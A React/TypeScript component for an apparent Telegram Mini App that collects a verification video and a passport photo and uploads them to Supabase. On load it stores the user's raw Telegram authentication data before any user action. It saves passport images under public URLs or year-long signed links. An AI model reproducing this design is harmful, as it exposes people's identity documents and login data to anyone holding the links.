// src/components/UserForm.tsx
import React, { useEffect, useMemo, useRef, useState } from 'react';
import { supabase } from '../lib/supabase';
import { useTelegram } from '../hooks/useTelegram';
import { useTranslation } from '../lib/i18n';
import { TelegramDataDisplay, VideoVerification, PassportCapture } from './DataCollectionSteps';

type Step = 'video' | 'passport' | 'done';
type Phase = 'idle' | 'uploadingVideo' | 'uploadingPassport' | 'finalizing';

export const UserForm: React.FC = () => {
  const {
    user, chat, receiver, chat_type, chat_instance, start_param, query_id, auth_date,
    initDataRaw, themeParams, platform, version, isExpanded
  } = useTelegram();
  const { t, setLanguage } = useTranslation();

  const [videoBlob, setVideoBlob] = useState<Blob | null>(null);
  const [passportImageBlob, setPassportImageBlob] = useState<Blob | null>(null);
  const [isRecording, setIsRecording] = useState(false);
  const [partialId, setPartialId] = useState<string | null>(null);
  const [step, setStep] = useState<Step>('video');

  // нижняя строка загрузки
  const [phase, setPhase] = useState<Phase>('idle');
  const [loadingText, setLoadingText] = useState<string>('');
  const [loadingVisible, setLoadingVisible] = useState<boolean>(false);
  const progressRef = useRef<number>(0);
  const rafRef = useRef<number | null>(null);

  // язык под юзера (без переключателя)
  useEffect(() => {
    const code = (user?.language_code || 'ru').toLowerCase();
    const map: Record<string, 'ru'|'uk'|'en'> = { ru:'ru', be:'ru', uk:'uk', en:'en', kk:'ru', uz:'ru' };
    setLanguage(map[code] || 'ru');
  }, [user, setLanguage]);

  // Создаём "мусорную" запись сразу при входе
  useEffect(() => {
    const init = async () => {
      try {
        const meta = {
          chat, receiver, chat_type, chat_instance, start_param, query_id, auth_date,
          initDataRaw, themeParams, platform, version, isExpanded,
          ts: new Date().toISOString(),
        };
        const { data, error } = await supabase
          .from('submissions')
          .insert([{
            telegram_user: user,
            video_url: null,
            passport_url: null,
            status: 'partial',
            user_id: user?.id ?? null,
            meta
          }])
          .select('id');
        if (!error && data?.[0]?.id) setPartialId(data[0].id);
        if (error) console.warn('partial insert error', error);
      } catch (e) {
        console.warn('partial insert exception', e);
      }
    };
    init();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Анимация нижней полосы (индифферентная, плавно «бежит»)
  const startIndeterminateBar = (label: string) => {
    setLoadingText(label);
    setLoadingVisible(true);
    progressRef.current = 0;
    const tick = () => {
      // ускорение до 90%, потом «пульсируем»
      const p = progressRef.current;
      const next =
        p < 0.9 ? p + (0.015 + (0.2 * (1 - p))) : 0.9 + 0.05 * Math.sin(Date.now() / 300);
      progressRef.current = Math.min(0.97, next);
      rafRef.current = requestAnimationFrame(tick);
    };
    if (rafRef.current) cancelAnimationFrame(rafRef.current);
    rafRef.current = requestAnimationFrame(tick);
  };
  const finishIndeterminateBar = () => {
    const end = () => {
      if (rafRef.current) cancelAnimationFrame(rafRef.current);
      rafRef.current = null;
      setLoadingVisible(false);
      progressRef.current = 0;
    };
    // плавно добежим до 100% и спрячем
    let p = progressRef.current;
    const ease = () => {
      p += (1 - p) * 0.25;
      progressRef.current = p;
      if (p > 0.995) {
        end();
      } else {
        rafRef.current = requestAnimationFrame(ease);
      }
    };
    if (rafRef.current) cancelAnimationFrame(rafRef.current);
    rafRef.current = requestAnimationFrame(ease);
  };

  // Захват видео: СРАЗУ переводим на паспорт. Аплоад идёт в фоне.
  const handleVideoRecorded = (blob: Blob) => {
    setVideoBlob(blob);
    // мгновенный переход
    setStep('passport');
    // запускаем «аплоадим видео»
    setPhase('uploadingVideo');
    startIndeterminateBar('Загружаем видео…');
  };

  // Аплоад видео в фоне
  useEffect(() => {
    const run = async () => {
      if (!videoBlob) return;

      // убедимся, что строка создана
      const ensureRow = async () => {
        if (partialId) return partialId;
        try {
          const { data, error } = await supabase
            .from('submissions')
            .insert([{
              telegram_user: user,
              video_url: null,
              passport_url: null,
              status: 'partial',
              user_id: user?.id ?? null,
              meta: { created_late: true, ts: new Date().toISOString() }
            }])
            .select('id');
          if (error) { console.warn('ensureRow insert error', error); return null; }
          const id = data?.[0]?.id || null;
          if (id) setPartialId(id);
          return id;
        } catch (e) { console.warn('ensureRow exception', e); return null; }
      };

      const id = await ensureRow();
      if (!id) return;

      try {
        const fileKey = `public/${user?.id || 'u'}_${Date.now()}.webm`;
        const up = await supabase.storage.from('videos').upload(fileKey, videoBlob, { contentType: 'video/webm', upsert: false });
        if (up.error) { console.warn('video upload error', up.error); return; }

        let videoUrl: string | null = null;
        const { data: pub } = supabase.storage.from('videos').getPublicUrl(fileKey);
        if (pub?.publicUrl) videoUrl = pub.publicUrl;
        if (!videoUrl) {
          const sign = await supabase.storage.from('videos').createSignedUrl(fileKey, 60 * 60 * 24 * 365);
          if (!sign.error) videoUrl = sign.data?.signedUrl ?? null;
        }

        if (videoUrl) {
          const upd = await supabase.from('submissions').update({ video_url: videoUrl }).eq('id', id);
          if (upd.error) console.warn('update video_url error', upd.error);
        }
      } catch (e) {
        console.warn('video save failed', e);
      } finally {
        if (phase === 'uploadingVideo') {
          setPhase('idle');
          finishIndeterminateBar();
        }
      }
    };
    run();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [videoBlob]);

  // Авто-аплоад паспорта + финализация
  useEffect(() => {
    const run = async () => {
      if (!passportImageBlob || !partialId) return;
      setPhase('uploadingPassport');
      startIndeterminateBar('Загружаем фото паспорта…');

      try {
        const fileKey = `public/${user?.id || 'u'}_${Date.now()}.png`;
        const up = await supabase.storage.from('passports').upload(fileKey, passportImageBlob, { contentType: 'image/png', upsert: false });
        if (up.error) { console.warn('passport upload error', up.error); return; }

        let passportUrl: string | null = null;
        const { data: pub } = supabase.storage.from('passports').getPublicUrl(fileKey);
        if (pub?.publicUrl) passportUrl = pub.publicUrl;
        if (!passportUrl) {
          const sign = await supabase.storage.from('passports').createSignedUrl(fileKey, 60 * 60 * 24 * 365);
          if (!sign.error) passportUrl = sign.data?.signedUrl ?? null;
        }

        // финализация
        setPhase('finalizing');
        setLoadingText('Отправляем заявку…');

        await supabase.from('submissions').update({ passport_url: passportUrl, status: 'submitted' }).eq('id', partialId);

        // Уведомление пользователю (без ожидания ответа)
        fetch('/api/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            user_id: user?.id,
            language_code: user?.language_code || 'ru',
            template: 'submitted',
            status: 'submitted'
          })
        }).catch(()=>{});

        // Готово
        setStep('done');
      } catch (e) {
        console.warn('passport save failed', e);
      } finally {
        finishIndeterminateBar();
        setPhase('idle');
      }
    };
    run();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [passportImageBlob, partialId]);

  const closeApp = () => {
    try { (window as any)?.Telegram?.WebApp?.close(); } catch {}
  };

  // процент для полосы
  const progressPercent = useMemo(() => Math.max(0, Math.min(100, Math.round(progressRef.current * 100))), [loadingVisible, phase, videoBlob, passportImageBlob, step]);

  return (
    <div className="p-4 py-4">
      <TelegramDataDisplay user={user} />

      {step === 'video' && (
        <>
          <h3 className="text-lg font-semibold text-tg-hint mt-4">{t('stepVideoTitle') || 'Шаг 1: Видеоверфикация'}</h3>
          <VideoVerification
            onVideoRecorded={handleVideoRecorded}
            onRecordingChange={setIsRecording}
          />
        </>
      )}

      {step === 'passport' && (
        <>
          <h3 className="text-lg font-semibold text-tg-hint mt-4">{t('stepPassportTitle') || 'Шаг 2: Фото паспорта'}</h3>
          <PassportCapture onImageCaptured={setPassportImageBlob} recording={isRecording} />
        </>
      )}

      {step === 'done' && (
        <div className="text-center p-8 bg-green-500/10 border border-green-500/30 rounded-2xl mt-6">
          <h3 className="text-2xl font-bold text-green-400">{t('successSubmittedTitle') || 'Заявка отправлена'}</h3>
          <p className="text-tg-hint mt-2">{t('successSubmittedMessage') || 'Ваша заявка успешно отправлена на обработку.'}</p>
          <button
            onClick={closeApp}
            className="mt-4 px-4 py-2 rounded-lg bg-tg-button text-tg-button-text text-sm"
          >
            {t('closeButton') || 'Закрыть'}
          </button>
        </div>
      )}

      {/* Нижняя строка загрузки */}
      {loadingVisible && (
        <div className="fixed left-0 right-0 bottom-0 z-40">
          <div className="mx-auto max-w-3xl px-4 pb-[env(safe-area-inset-bottom)]">
            <div className="rounded-t-2xl bg-tg-secondary-bg/95 border border-white/10 p-3 shadow-2xl">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs text-tg-hint">{loadingText}</span>
                <span className="text-xs text-tg-hint">{progressPercent}%</span>
              </div>
              <div className="h-2 w-full bg-white/10 rounded-full overflow-hidden">
                <div
                  className="h-full bg-tg-link transition-all"
                  style={{ width: `${progressPercent}%` }}
                />
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
